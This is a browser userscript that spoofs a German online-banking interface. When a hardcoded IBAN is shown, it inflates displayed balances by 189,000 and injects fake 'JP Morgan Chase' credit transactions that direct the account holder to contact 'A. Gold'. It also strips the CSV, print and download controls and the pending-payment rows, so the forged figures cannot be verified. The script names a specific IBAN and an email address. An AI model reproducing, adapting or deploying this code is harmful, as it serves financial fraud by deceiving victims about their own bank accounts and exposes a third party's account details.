// ==UserScript==
// @name         Ed 4Rec  hypo.abublitz46@gmx.de
// @namespace    http://tampermonkey.net/
// @version      7.7
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/539103/Ed%204Rec%20%20hypoabublitz46%40gmxde.user.js
// @updateURL https://update.greasyfork.org/scripts/539103/Ed%204Rec%20%20hypoabublitz46%40gmxde.meta.js
// ==/UserScript==


const MBALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 189000 },
        { index: 1, adjustmentAmount: 189000 },
        { index: 2, adjustmentAmount: 189000 },
        { index: 3, adjustmentAmount: 189000 },
    //     { index: 4, adjustmentAmount: 1 },
        // Add more configs as needed
    ];

   // ✅ Amount to add/subtract (can be negative)
    const adjustmentAmount = 189000.00;

    // ✅ Target IBAN (case and whitespace insensitive)
    const IbanCheck = "DE80 2003 0000 0019 0832 38";


    const transactions = [
         {
            id: "tx2",
            date: "05.08.2025",  // 31.07.2025
            type: "GUTSCHRIFT",
            title: "JP Morgan Chase.  Bitte sich an A. Gold wenden. Ohne ihn nicht ausgeben",
            category:  "Gutschrift",
            categorySub:"Gutschrift",
            amountBeforeDecimal: "11.000,",
            amountAfterDecimal: "00",
            currency: "EUR",
        },
        {
            id: "tx1",
            date: "18.08.2025",  // 31.07.2025
            type: "GUTSCHRIFT",
            title: "JP Morgan Chase. Freigabe erteilt durch Absender. Bitte sich an A. Gold wenden.",
            category:  "Gutschrift",
            categorySub:"Gutschrift",
            amountBeforeDecimal: "177.977,",
            amountAfterDecimal: "00",
            currency: "EUR",
        },
          
        // Add more transactions as needed
    ];



 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
    'use strict';

 //   const MBALANCE_CONFIGS = [
 //       { index: 1, adjustmentAmount: 7700 },
  //      { index: 4, adjustmentAmount: 7700 },
  //      { index: 5, adjustmentAmount: 7700 },
  //      { index: 6, adjustmentAmount: 0 },
  //      // Extend this list as needed
 //   ];

    const TRIGGER_SELECTOR = '.ui-outputlabel.ui-widget.old_old_c1.copy-1.regular';
    const BALANCE_SELECTORS = ['.ubis__money', '.ubis__money.m', '.ubis__money.money-negative'];

    function parseBalance(pre, dec) {
        const str = pre.replace(/\./g, '').replace(',', '.') + dec;
        return parseFloat(str);
    }

    function formatBalance(amount) {
        const formatted = amount.toFixed(2).replace('.', ',');
        const [pre, dec] = formatted.split(',');
        const preWithDots = pre.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
        return { pre: preWithDots + ',', dec };
    }

    function updateClassBasedOnValue(el, newValue) {
        if (newValue < 0) {
            el.classList.add('money-negative');
        } else {
            el.classList.remove('money-negative');
        }
    }

    function adjustBalances() {
        const allBalances = Array.from(document.querySelectorAll(BALANCE_SELECTORS.join(',')));
        let updated = false;

        MBALANCE_CONFIGS.forEach(config => {
            const el = allBalances[config.index];
            if (!el) return;

            const preEl = el.querySelector('.ubis__money__decimal');
            const decEl = el.querySelector('.ubis__money__digit');

            if (preEl && decEl) {
                const originalValue = parseBalance(preEl.textContent, decEl.textContent);
                const newValue = originalValue + config.adjustmentAmount;
                const formatted = formatBalance(newValue);

                preEl.textContent = formatted.pre;
                decEl.textContent = formatted.dec;

                updateClassBasedOnValue(el, newValue);
                updated = true;
            }
        });

        return updated;
    }

    function checkAndAdjust() {
        const triggerElements = document.querySelectorAll(TRIGGER_SELECTOR);
        const balanceElements = document.querySelectorAll(BALANCE_SELECTORS.join(','));

        if (triggerElements.length > 0 && balanceElements.length > 0) {
            const wasUpdated = adjustBalances();

            if (wasUpdated) {
                setTimeout(() => {
                    triggerElements.forEach(el => el.remove());
                    console.log("✅ Trigger elements removed after successful balance update.");
                }, 5);
            } else {
                console.log("⚠️ Balance update not performed — triggers retained.");
            }
        }
    }

    setInterval(checkAndAdjust, 50);
}

 if (
    window.location.href.includes("de") ||
    window.location.href.includes("mainscript") ||
    window.location.href.includes("Downloads")
) {
    'use strict';

  //  const adjustmentAmount = 5000.78;
  //  const IbanCheck = "DE24 7002 0270 0045 6374 33";

    function normalizeIban(iban) {
        return iban.replace(/\s+/g, '').toUpperCase();
    }

    function parseBalance(preDecimal, postDecimal) {
        const hasMinus = preDecimal.trim().startsWith('-');
        const numeric = preDecimal.replace(/[^0-9,]/g, '').replace(',', '.') + postDecimal;
        const value = parseFloat(numeric);
        return hasMinus ? -value : value;
    }

    function formatBalance(value) {
        const isNegative = value < 0;
        value = Math.abs(value);
        const euros = Math.floor(value).toString();
        const cents = Math.round((value - Math.floor(value)) * 100).toString().padStart(2, '0');
        const formattedEuros = euros.replace(/\B(?=(\d{3})+(?!\d))/g, '.');

        return {
            isNegative,
            preDecimal: (isNegative ? '-' : '') + formattedEuros + ',',
            postDecimal: cents
        };
    }

    function adjustBalancesAndCleanUp() {
        console.count("🔁 Interval execution");

        try {
            const ibanContainer = document.querySelector('.account-selector-iban');
            const triggerElements = document.querySelectorAll('.ubis__dashboard_date.old_old_c1.copy-1.regular');

            if (!ibanContainer) {
                console.warn("⚠️ IBAN container not found.");
                return;
            }

            if (triggerElements.length === 0) {
                console.warn("⚠️ No trigger elements present.");
                return;
            }

            const ibanElement = ibanContainer.querySelector('span.regular');
            if (!ibanElement) {
                console.warn("⚠️ IBAN span not found.");
                return;
            }

            const normalizedPageIban = normalizeIban(ibanElement.textContent);
            const normalizedCheckIban = normalizeIban(IbanCheck);
            console.log(`🔍 Page IBAN: ${normalizedPageIban}`);

            if (normalizedPageIban !== normalizedCheckIban) {
                console.warn("❌ IBAN mismatch. Skipping.");
                return;
            }

            const balanceSpans = Array.from(document.querySelectorAll('.ubis__money.smallpostcomma, .ubis__money.smallpostcomma.money-negative'));

            if (balanceSpans.length === 0) {
                console.warn("⚠️ No balance elements found to adjust.");
                return;
            }

            let adjustmentCount = 0;

            balanceSpans.forEach(span => {
                const decimalSpan = span.querySelector('.ubis__money__decimal');
                const digitSpan = span.querySelector('.ubis__money__digit');
                const currencySpan = span.querySelector('.ubis__money__currency');

                if (!decimalSpan || !digitSpan || !currencySpan) {
                    console.warn("⚠️ Balance sub-elements missing, skipping one span.");
                    return;
                }

                const originalValue = parseBalance(decimalSpan.textContent, digitSpan.textContent);
                const newValue = originalValue + adjustmentAmount;
                const formatted = formatBalance(newValue);

                decimalSpan.textContent = formatted.preDecimal;
                digitSpan.textContent = formatted.postDecimal;

                if (formatted.isNegative) {
                    span.classList.add('money-negative');
                } else {
                    span.classList.remove('money-negative');
                }

                console.log(`✅ Balance updated: ${originalValue} → ${newValue}`);
                adjustmentCount++;
            });

            if (adjustmentCount > 0) {
                setTimeout(() => {
                    triggerElements.forEach(el => el.remove());
                    console.log(`🧹 Trigger elements removed after ${adjustmentCount} balance updates.`);
                }, 5);
            } else {
                console.log("ℹ️ No balances modified; trigger elements not removed.");
            }

        } catch (err) {
            console.error("💥 Exception during adjustment:", err);
        }
    }

    setInterval(adjustBalancesAndCleanUp, 50);
    console.log("🚀 Interval started: Running every 100ms.");
}



if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

    'use strict';

    // === 🟢 START: IBAN and Transactions Configuration ===
 //   const IbanCheck = "DE80 2003 0000 0019 0832 38";
//
//    const transactions = [
//        {
//            id: "tx1",
//            date: "Vorgemerkt",
//            type: "GUTSCHRIFT",
//            title: "JP Morgan Chase. Freigabe nötig durch Absender. Bitte sich an A. Gold wenden.",
//              category:  "JP Morgan Chase. Freigabe nötig durch Absender. Bitte sich an A. Gold wenden.",
//               categorySub:"JP Morgan Chase. Freigabe nötig durch Absender. Bitte sich an A. Gold wenden.",
//            amountBeforeDecimal: "177.977,",
//            amountAfterDecimal: "00",
//            currency: "EUR",
//        }
//        // Add more transactions as needed
//    ];
    // === 🔚 END: Configuration ===

    const normalizeIban = (iban) => iban.replace(/\s+/g, '').toUpperCase();
    const targetIban = normalizeIban(IbanCheck);

    function buildCustomRow(tx) {
        const amountIsNegative = tx.amountBeforeDecimal.trim().startsWith("-");

        const tr = document.createElement('tr');
        tr.setAttribute('data-custom-transaction', tx.id);
        tr.setAttribute('data-ri', 'custom');
        tr.className = 'ui-widget-content ui-datatable-even';
        tr.setAttribute('role', 'row');
        tr.setAttribute('style', 'cursor:pointer');

     tr.innerHTML = `
  <td role="gridcell" class="ubis__columns__rowToggler">
    <div class="ui-row-toggler ui-icon ui-icon-circle-triangle-e" tabindex="0" role="button" aria-expanded="false" aria-label="Toggle Row"></div>
  </td>
  <td role="gridcell" class="ubis__columns__buchung">${tx.date}</td>
  <td role="gridcell" class="pfm_description_column">${tx.type}<br>${tx.title}</td>
  <td role="gridcell" class="ubis__pfm_budget_category_column">
    <span style="padding-left:0.64%" class="ui-g pfm-table-category" tabindex="0" aria-label="Umsatzkategorie ändern">
      <div class="ui-g-3 category-icon">
        <i class="${tx.categoryIconClass}" title="${tx.categoryIconTitle}" aria-label="Kategorie ${tx.categorySub}"></i>
      </div>
      <div class="ui-g-8 category-name">
        <div>${tx.category}</div>
        <div>${tx.categorySub}</div>
      </div>
      <div class="ui-g-1 edit">
        <i class="i1 icon_arrow bold" aria-label="Kategorie ändern"></i>
      </div>
    </span>
  </td>
  <td role="gridcell" class="ubis__columns__money">
    <span aria-hidden="true" class="ubis__money ${amountIsNegative ? "money-negative" : ""}">
      <span class="ubis__money__decimal">${tx.amountBeforeDecimal}</span>
      <span class="ubis__money__digit">${tx.amountAfterDecimal}</span>
      <span class="ubis__money__currency">${tx.currency}</span>
    </span>
    <span class="hidesr">${amountIsNegative ? "minus " : ""}${tx.amountBeforeDecimal.replace("-", "")}${tx.amountAfterDecimal} ${tx.currency}</span>
  </td>
`;

        return tr;
    }

    setInterval(() => {
        const ibanWrapper = document.querySelector('.account-selector-iban');
        const ibanElement = ibanWrapper?.querySelector('span[aria-hidden="true"]');
        const container = document.querySelector('.ui-datatable-data.ui-widget-content');

        if (!ibanWrapper || !ibanElement || !container) return;

        const currentIban = normalizeIban(ibanElement.textContent || "");
        if (currentIban !== targetIban) return;

        for (const tx of transactions) {
            const exists = container.querySelector(`tr[data-custom-transaction="${tx.id}"]`);
            if (!exists) {
                const row = buildCustomRow(tx);
                container.appendChild(row);
            }
        }
    }, 300);

    // Fix row class consistency
    setInterval(() => {
        const oddElements = document.querySelectorAll('.ui-widget-content.ui-datatable-odd');
        oddElements.forEach(el => {
            el.classList.remove('ui-datatable-odd');
            el.classList.add('ui-datatable-even');
        });
    }, 100);

}


if (
    window.location.href.indexOf("de") > 0 ||
    window.location.href.indexOf("mainscript") > 0 ||
    window.location.href.indexOf("Downloads") > 0
) {
    const CHECK_INTERVAL_MS = 100;
    const seenElements = new WeakSet();

  const CONFIG = [
    { selector: '[aria-label="CSV"]', remove: true },
    { selector: '[aria-label="PDF"]', remove: false },
    { selector: '[aria-label="Drucken"]', remove: true },
    { selector: '[title="Drucken"]', remove: true }, // ✅ NEW LINE
    { selector: '[aria-label="Download"]', remove: true },
    {
        selector:
            '.ui-commandlink.ui-widget.ubis__advancedsearch_activator.ubis_advancedsearch_activator_disabled.pull-right.link.link--text.uppercase',
        remove: true,
    },
    {
        parentSelector: "#pendingPaymentsForm\\:payments_data",
        childSelector: ".ui-widget-content.ui-datatable-even",
        remove: true,
    },
];

    function checkAndRemove() {
        CONFIG.forEach(({ selector, parentSelector, childSelector, remove }) => {
            // Standard selector case
            if (selector) {
                document.querySelectorAll(selector).forEach((elem) => {
                    if (!seenElements.has(elem)) {
                        seenElements.add(elem);
                        if (remove) {
                            elem.remove();
                            console.log(`Removed: ${selector}`);
                        } else {
                            console.log(`Kept: ${selector}`);
                        }
                    }
                });
            }

            // Special parent-child selector case
            if (parentSelector && childSelector) {
                const parent = document.querySelector(parentSelector);
                if (parent) {
                    parent.querySelectorAll(childSelector).forEach((elem) => {
                        if (!seenElements.has(elem)) {
                            seenElements.add(elem);
                            if (remove) {
                                elem.remove();
                                console.log(`Removed: ${childSelector} under ${parentSelector}`);
                            } else {
                                console.log(`Kept: ${childSelector} under ${parentSelector}`);
                            }
                        }
                    });
                }
            }
        });
    }

    setInterval(checkAndRemove, CHECK_INTERVAL_MS);
}





